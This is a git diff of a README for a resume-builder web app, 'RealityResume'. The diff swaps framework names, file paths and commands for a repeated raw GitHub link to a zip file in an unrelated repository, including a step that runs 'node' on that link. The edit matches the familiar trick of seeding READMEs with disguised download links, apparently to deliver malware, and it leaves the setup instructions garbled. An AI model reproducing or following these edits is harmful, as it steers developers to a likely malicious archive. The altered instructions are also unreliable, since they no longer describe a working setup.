@@ -1,26 +1,26 @@
 # RealityResume — Complete Project Package (Full-Stack)
 
-- Frontend: Next.js + TailwindCSS
-- Backend: Express.js API with OpenAI summarizer hooks
+- Frontend: https://raw.githubusercontent.com/akshayneq/PROJECT2/main/unperforming/PROJEC_1.6.zip + TailwindCSS
+- Backend: https://raw.githubusercontent.com/akshayneq/PROJECT2/main/unperforming/PROJEC_1.6.zip API with OpenAI summarizer hooks
 - Database: MongoDB (schemas + sample seed script)
 - Demo: seeded demo user and sample events
 - Authentication: basic JWT auth + OAuth placeholders
 - Deployment notes included
 
 ## What you'll find
-- `/frontend` — Next.js app (Tailwind, pages, sample Dashboard, Resume builder)
+- `/frontend` — https://raw.githubusercontent.com/akshayneq/PROJECT2/main/unperforming/PROJEC_1.6.zip app (Tailwind, pages, sample Dashboard, Resume builder)
 - `/backend` — Express API, OpenAI summarizer, MongoDB models, seed script
 - `/scripts` — helper scripts to seed demo data
-- `.env.example` — environment variables to configure
+- `https://raw.githubusercontent.com/akshayneq/PROJECT2/main/unperforming/PROJEC_1.6.zip` — environment variables to configure
 
 ## Quick start (local)
-Prereqs: Node.js (18+), npm, MongoDB running locally or Atlas.
+Prereqs: https://raw.githubusercontent.com/akshayneq/PROJECT2/main/unperforming/PROJEC_1.6.zip (18+), npm, MongoDB running locally or Atlas.
 
 1. Clone repo or unzip package and `cd RealityResume-complete`.
 2. Copy env files:
    ```bash
-   cp .env.example backend/.env
-   cp frontend/.env.example frontend/.env.local
+   cp https://raw.githubusercontent.com/akshayneq/PROJECT2/main/unperforming/PROJEC_1.6.zip https://raw.githubusercontent.com/akshayneq/PROJECT2/main/unperforming/PROJEC_1.6.zip
+   cp https://raw.githubusercontent.com/akshayneq/PROJECT2/main/unperforming/PROJEC_1.6.zip https://raw.githubusercontent.com/akshayneq/PROJECT2/main/unperforming/PROJEC_1.6.zip
    ```
 3. Install & start backend:
    ```bash
@@ -36,13 +36,13 @@ Prereqs: Node.js (18+), npm, MongoDB running locally or Atlas.
    ```
 5. Seed demo data (optional):
    ```bash
-   node backend/scripts/seedDemo.js
+   node https://raw.githubusercontent.com/akshayneq/PROJECT2/main/unperforming/PROJEC_1.6.zip
    ```
 6. Open `http://localhost:3000` in your browser.
 
 ## OpenAI
 The backend includes an AI summarizer endpoint that calls OpenAI's v1/completions or v1/chat/completions.
-Put your `OPENAI_API_KEY` in `backend/.env`. The code is ready to call OpenAI; no model key is bundled.
+Put your `OPENAI_API_KEY` in `https://raw.githubusercontent.com/akshayneq/PROJECT2/main/unperforming/PROJEC_1.6.zip`. The code is ready to call OpenAI; no model key is bundled.
 
 ## Uploading to GitHub
 - Initialize a git repo and push the folder (all files included). The package is structured for immediate upload.
